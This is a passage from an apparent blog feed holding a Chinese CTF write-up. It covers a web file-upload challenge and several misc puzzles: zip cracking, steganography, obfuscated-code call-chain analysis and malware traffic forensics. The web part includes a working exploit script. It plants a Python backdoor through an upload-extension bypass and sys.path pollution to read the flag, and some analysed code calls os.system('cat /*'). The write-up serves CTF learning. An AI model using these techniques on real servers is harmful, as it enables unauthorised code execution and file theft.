class="hljs-string">&quot;__spec__&quot;</span>]<br></code></pre></td></tr></table></figure><p>可以利用<code>pydash.helpers</code>导入<code>inspect</code>来绕过</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_upload-2.png"></p><p>还有一点要注意，上传时对<code>$type</code>进行了检查，不允许上传<code>py</code>类型的文件，但是<code>$type</code>的值是可控的，我们可以将其置空</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//line 32</span><br><span class="hljs-variable">$newFile</span> = <span class="hljs-variable">$res</span> . <span class="hljs-variable">$file_path</span> . <span class="hljs-string">&quot;.<span class="hljs-subst">&#123;$type&#125;</span>&quot;</span>;<br></code></pre></td></tr></table></figure><p>如果<code>$type</code>为空，就会在文件尾加一个点，例如<code>backdoor.py.</code></p><p>这里可以用<code>file_put_contents</code>的一个<code>trick</code>绕过，如图</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_upload-3.png"></p><p>例如<code>backdoor.py/.</code>，<code>file_put_contents</code>会自已给标准化成绝对路径</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br>url = <span class="hljs-string">&quot;x.x.x.x&quot;</span><br>shell = <span class="hljs-string">&#x27;&#x27;&#x27;import os</span><br><span class="hljs-string">def backdoor():</span><br><span class="hljs-string">    return os.popen(&quot;cat /flag&quot;).read()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    data = <span class="hljs-string">&quot;data:image/;base64,&quot;</span> + base64.b64encode(shell.encode()).decode()<br>    start = <span class="hljs-built_in">int</span>(time.time())<br>    res = requests.post(<br>        url=url+<span class="hljs-string">&quot;index.php?action=base64&amp;path=backdoor.py/&quot;</span>, data=data)<br>    end = <span class="hljs-built_in">int</span>(time.time())<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start, end+<span class="hljs-number">2</span>):<br>        <span class="hljs-built_in">print</span>(i)<br>        data = &#123;<br>            <span class="hljs-string">&quot;key&quot;</span>: <span class="hljs-string">&quot;__init__.__globals__.pydash.helpers.inspect.sys.path[0]&quot;</span>,<br>            <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;/tmp/%s/&quot;</span> % (i)<br>        &#125;<br>        <span class="hljs-built_in">print</span>(data)<br>        requests.post(url=url+<span class="hljs-string">&quot;app/set&quot;</span>,json=data)<br>        res = requests.get(url=url+<span class="hljs-string">&quot;app/get&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag??&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.text <span class="hljs-keyword">and</span> res.status_code != <span class="hljs-number">500</span>:<br>            <span class="hljs-built_in">print</span>(res.text)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(res.text)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    exploit()<br></code></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>zip注释：<code>The art of 0 and 1, and it will remain shorter than 9.</code></p><p>生成字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">my_dict = &#123;&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>    bin_strings = [<span class="hljs-built_in">bin</span>(j)[<span class="hljs-number">2</span>:].zfill(i) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**i)]<br>    my_dict[i] = bin_strings<br><span class="hljs-keyword">for</span> key,value <span class="hljs-keyword">in</span> my_dict.items():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;dic.txt&#x27;</span>,<span class="hljs-string">&#x27;a+&#x27;</span>)<span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> value:<br>            f.write(i+<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>爆破得到密码<code>01001101</code></p><p>解压得到flag</p><h2 id="SimpleDocument"><a href="#SimpleDocument" class="headerlink" title="SimpleDocument"></a>SimpleDocument</h2><p>图片分离出一个pdf，用pdf编辑器全选，发现有一个隐藏的文本</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/SimpleDocument.png"></p><h2 id="BeautifulImage"><a href="#BeautifulImage" class="headerlink" title="BeautifulImage"></a>BeautifulImage</h2><p>stegsolve分析，0通道藏有base加密字符串</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/BeautifulImage.png"></p><h2 id="tree"><a href="#tree" class="headerlink" title="tree"></a>tree</h2><p>下载附件得到一个<code>tree.py</code>，约有60w行代码</p><p>部分代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># the o mean is 0!</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_0aB30386</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_o02aA7B4</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> -<span class="hljs-number">1705</span> &lt; <span class="hljs-number">2926</span>:<br>            tree_b270co58.tree_f79D6eB3(self)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_51o1oA3a</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_433218o8</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-number">1793</span> &lt; -<span class="hljs-number">5366</span>:<br>            tree_B813Fe08.tree_AaA1b735(self)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_2598o3do</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_7C0ooB75</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> -<span class="hljs-number">7226</span> &gt; -<span class="hljs-number">7705</span>:<br>            tree_3482o9ob.tree_0d6aDA0F(self)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_0a351C93</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_39cD9171</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-number">9865</span> &lt; <span class="hljs-number">592</span>:<br>            tree_Coc29fcC.tree_22E98104(self)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_170EE546</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_70759F44</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> -<span class="hljs-number">8714</span> &lt; <span class="hljs-number">4093</span>:<br>            tree_8D0oE9Cf.tree_2F7682e6(self)<br></code></pre></td></tr></table></figure><p>且存在部分函数调用<code>os.system</code>，执行的语句均为<code>cat /*</code></p><p>除了<code>os</code>函数外，其他函数都存在一个<code>if</code>，判断成功时引用下一个类</p><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> ast<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_91fo80eD</span>():<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_7040e9o9</span>(<span class="hljs-params">self</span>):<br>       os.system(<span class="hljs-string">&#x27;cat /*&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_88eF054e</span>():<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_o00o0b68</span>(<span class="hljs-params">self</span>):<br>       tree_91fo80eD.tree_7040e9o9(self)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_1a0c10D0</span>():<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_4Cc0o1Do</span>(<span class="hljs-params">self</span>):<br>       tree_88eF054e().tree_o00o0b68(self)<br></code></pre></td></tr></table></figure><p>这段代码的完整利用链为：<br><code>tree_1a0c10D0.tree_4Cc0o1Do() -&gt; tree_88eF054e.tree_o00o0b68() -&gt; tree_91fo80eD.tree_7040e9o9()</code></p><p>所以我们需要分析代码，找到最终触发<code>os.system</code>的利用链，并提取出来</p><p>同时对所有<code>os.system</code>语句标记污点，如果遇到<code>if</code>判断错误的，则直接取消污点标记，并一直往上寻找最终利用链，并记录类名、函数名和函数内的具体内容</p><p>根据提示<code># the o mean is 0!</code>，提取所有完整利用链的类名的后8位十六进制字符，并将o转化为0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ast<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> astor<br><br><span class="hljs-comment"># 解析Python文件，获取语法树</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;tree.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>   source_code = file.read()<br>syntax_tree = ast.parse(source_code)<br><br><span class="hljs-comment"># 初始化类名和函数字典</span><br>class_dict = &#123;&#125;<br><br><span class="hljs-comment"># 遍历语法树，获取类和函数名</span><br><span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> syntax_tree.body:<br>   <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(node, ast.ClassDef):<br>       class_name = node.name<br>       class_dict[class_name] = &#123;&#125;<br>       <span class="hljs-keyword">for</span> inner_node <span class="hljs-keyword">in</span> node.body:<br>           <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(inner_node, ast.FunctionDef):<br>               func_name = inner_node.name<br>               class_dict[class_name][func_name] = []<br>               <span class="hljs-keyword">for</span> code <span class="hljs-keyword">in</span> inner_node.body:<br>                   class_dict[class_name][func_name].append(astor.to_source(code).strip())<br><br><span class="hljs-comment"># 输出结果</span><br><br>class_keys = []<br><span class="hljs-keyword">for</span> func_dict <span class="hljs-keyword">in</span> class_dict.items():<br>   <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os.system&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(func_dict):<br>       sub = func_dict[<span class="hljs-number">1</span>][<span class="hljs-built_in">list</span>(func_dict[<span class="hljs-number">1</span>].items())[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]][<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27;\n&#x27;</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27; &#x27;</span>)<br>       <span class="hljs-keyword">if</span> sub[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;&gt;&#x27;</span>:<br>           <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">1</span>]) &lt; <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">3</span>][:-<span class="hljs-number">1</span>]):<br>               <span class="hljs-keyword">continue</span><br>       <span class="hljs-keyword">elif</span> sub[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;&lt;&#x27;</span>:<br>           <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">1</span>]) &gt; <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">3</span>][:-<span class="hljs-number">1</span>]):<br>               <span class="hljs-keyword">continue</span><br>       class_keys.append(func_dict[<span class="hljs-number">0</span>])<br><br><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> class_keys:<br>   class_key = key<br>   func_key = <span class="hljs-built_in">list</span>(class_dict[class_key])[<span class="hljs-number">0</span>]<br>   list_class = [class_key]<br>   flag = <span class="hljs-number">1</span><br>   flags = <span class="hljs-number">0</span><br>   <span class="hljs-keyword">while</span> flag != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> flags == <span class="hljs-number">0</span>:<br>       flag = <span class="hljs-number">1</span><br>       flags = <span class="hljs-number">0</span><br>       <span class="hljs-keyword">for</span> func_dict <span class="hljs-keyword">in</span> class_dict.items():<br>           <span class="hljs-keyword">for</span> code <span class="hljs-keyword">in</span> func_dict[<span class="hljs-number">1</span>].items():<br>               <span class="hljs-comment"># print(func_dict[1].items(), flag)</span><br>               <span class="hljs-keyword">if</span> class_key <span class="hljs-keyword">in</span> code[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] <span class="hljs-keyword">and</span> func_key <span class="hljs-keyword">in</span> code[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]:<br>                   sub = code[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27;\n&#x27;</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27; &#x27;</span>)<br>                   <span class="hljs-keyword">if</span> sub[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;&gt;&#x27;</span>:<br>                       <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">1</span>]) &lt; <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">3</span>][:-<span class="hljs-number">1</span>]):<br>                           flag = -<span class="hljs-number">1</span><br>                   <span class="hljs-keyword">elif</span> sub[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;&lt;&#x27;</span>:<br>                       <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">1</span>]) &gt; <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">3</span>][:-<span class="hljs-number">1</span>]):<br>                           flag = -<span class="hljs-number">1</span><br>                   flags = <span class="hljs-number">2</span><br>                   func_key = code[<span class="hljs-number">0</span>]<br>                   class_key = func_dict[<span class="hljs-number">0</span>]<br>                   <span class="hljs-comment"># print(func_key, class_key)</span><br>                   <span class="hljs-comment"># print(func_key, class_key)</span><br>                   list_class.append(class_key)<br>                   <span class="hljs-comment"># print(list_class)</span><br>       <span class="hljs-keyword">else</span>:<br>           <span class="hljs-comment"># print(flag, flags)</span><br>           <span class="hljs-keyword">if</span> flag == -<span class="hljs-number">1</span>:<br>               flags = <span class="hljs-number">1</span><br>           <span class="hljs-keyword">if</span> flags == <span class="hljs-number">2</span>:<br>               flags = <span class="hljs-number">0</span><br>               <span class="hljs-keyword">continue</span><br>           <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> flags == <span class="hljs-number">0</span>:<br>               <span class="hljs-keyword">break</span><br>   <span class="hljs-comment"># 将完整利用链的类名，去除tree_，o改为0，按照顺序输出成字符串</span><br>   <span class="hljs-keyword">if</span> flag != -<span class="hljs-number">1</span>:<br>       <span class="hljs-keyword">for</span> cla <span class="hljs-keyword">in</span> list_class:<br>           <span class="hljs-built_in">print</span>(cla[<span class="hljs-number">5</span>:].replace(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>       <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>最终得到两条完整的利用链</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">7468652070617373776f7264206973203730383532613933613336343963613736653335626138353833376566613135<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">377aBCAf271c00041373e10830000000000000006A0000000000000057Acbd47A5c4CDB728a43AF6d91D92D25519Bac7876E97909B633223d3A1d7417A3a741ddAfB0E9A7F0b25C726085149ad1da4D40104060001093000070B0100022406F1070112530f9A96C63163E0Df042FD12EC0b32431902121010001000C2A2600080a017088A4910000050119010011130066006c00610067002e0074007800740000001900140a01008B43f758BE7Ad901150601002000000000000000<br></code></pre></td></tr></table></figure><p>转字符串后发现一个为<code>7z</code>文件，一个为<code>the password is 70852a93a3649ca76e35ba85837efa15</code>，解压得到flag</p><h2 id="hacker-traffic"><a href="#hacker-traffic" class="headerlink" title="hacker_traffic"></a>hacker_traffic</h2><p>在第4615条流中发现flag.zip</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-1.png"></p><p>注释内容：<code>password is (md5(virus_file) + lhost_ip)</code></p><p>同时发现流量中有很多elf文件，使用tshark或者python提取</p><p>这里使用binwalk，但是需要注意部分binwalk版本不能提取elf文件</p><p>需要修改<code>/usr/lib/python3/dist-packages/binwalk/config/extract.conf</code>文件(以kali默认位置为例)</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-2.png"></p><p>共提取出100个elf文件，且每个elf文件运行后都会打印一个md5值</p><p>使用tcpdump监听后运行所有elf文件<br><code>tcpdump -tttt -s0 -X -vv -w t.pcap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用find命令查找当前文件夹下所有的elf文件</span><br>elf_files=$(find . -maxdepth 1 -type f -executable -name &quot;*.elf&quot;)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用循环依次执行每一个elf文件</span><br>for file in $elf_files<br>do<br>  echo &quot;Executing $file&quot;<br>  ./$file<br>done<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-3.png"></p><p>分析<code>t.pcap</code>文件，发现只有<code>22E7CF.elf</code>访问了<code>192.168.3.201</code>这个ip</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-4.png"></p><p>将文件md5和地址拼接后解压提示密码错误，是因为tcp传输文件会有冗余，需要计算elf文件的真正大小</p><p>readelf读文件</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-5.png"></p><p>得到</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">Start of section headers:          14736 (bytes into file)<br>Size of section headers:           64 (bytes)<br>Number of section headers:         30<br></code></pre></td></tr></table></figure><p>参考文章：<a href="https://luomuxiaoxiao.com/?p=139">计算机原理系列之二 ——– 详解ELF文件</a></p><p>计算得到<code>14736+64*30=16656字节</code></p><p>16656即4110(16进制)，将冗余的数据去除</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-6.png"></p><p>计算真正的md5</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-7.png"></p><p>拼接起来，得到<code>0f82ecb23adc35a4a5e3d8bdabbafe15192.168.3.201</code></p><p>解压得到一个py脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> secret<br>key = <span class="hljs-string">&quot;x.x.x.x&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_flag</span>(<span class="hljs-params">flag, key</span>):<br>    random.seed(key)<br>    table = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">38</span>))<br>    random.shuffle(table)<br>    flag = [flag[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> table]<br>    ascii_flag = [<span class="hljs-built_in">ord</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> flag]<br>    random.seed(key)<br>    xor_key = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)<br>    encrypted_flag = [c ^ xor_key <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> ascii_flag]<br>    <span class="hljs-keyword">return</span> base64.b64encode(<span class="hljs-built_in">bytes</span>(encrypted_flag)).decode(<span class="hljs-string">&quot;ascii&quot;</span>)<br><span class="hljs-built_in">print</span>(encrypt_flag(flag, key))<br><span class="hljs-comment"># VFVWU1kGBgIMUlMBVFcBBgRRBFAHVFBVUFkbUB0DAQMEBVIGAlE=</span><br></code></pre></td></tr></table></figure><p>伪随机+shuffle生成s盒进行的置换异或加密</p><p>根据<code>key=&quot;x.x.x.x&quot;</code>可知key就是ip地址，为<code>192.168.3.201</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> random<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_flag</span>(<span class="hljs-params">encrypted_flag, key</span>):<br>   random.seed(key)<br>   table = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">38</span>))<br>   random.shuffle(table)<br>   <span class="hljs-comment"># 解码base64编码的字符串</span><br>   encrypted_flag = base64.b64decode(encrypted_flag.encode(<span class="hljs-string">&quot;ascii&quot;</span>))<br><br>   <span class="hljs-comment"># 随机生成一个密钥</span><br>   random.seed(key)<br>   xor_key = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)<br><br>   <span class="hljs-comment"># 对加密后的ASCII码列表进行异或运算</span><br>   decrypted_flag = [c ^ xor_key <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> encrypted_flag]<br><br>   <span class="hljs-comment"># 将异或后的ASCII码列表转换成字符列表</span><br>   flag = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> decrypted_flag])<br>   final_flag = [<span class="hljs-number">0</span>]*<span class="hljs-number">38</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(table)):<br>       final_flag[table[i]] = flag[i]<br><br>   <span class="hljs-comment"># 返回解密后的flag字符串</span><br>   <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(final_flag)<br><br>key = <span class="hljs-string">&quot;192.168.3.201&quot;</span><br>text = <span class="hljs-string">&#x27;VFVWU1kGBgIMUlMBVFcBBgRRBFAHVFBVUFkbUB0DAQMEBVIGAlE=&#x27;</span><br>flag = decrypt_flag(text, key)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;Query&quot;&gt;&lt;a href=&quot;#Query&quot; class=&quot;headerlink&quot; title=&quot;Query&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="宁波" scheme="https://www.lewiserii.top/tags/%E5%AE%81%E6%B3%A2/"/>
    
  </entry>
  
  <entry>
    <title>awd工具开发</title>
    <link href="https://www.lewiserii.top/awd/awd%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91.html"/>
    <id>https://www.lewiserii.top/awd/awd%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91.html</id>
    <published>2023-05-18T06:00:00.000Z</published>
    <updated>2023-05-18T12:47:20.119Z</updated>
    
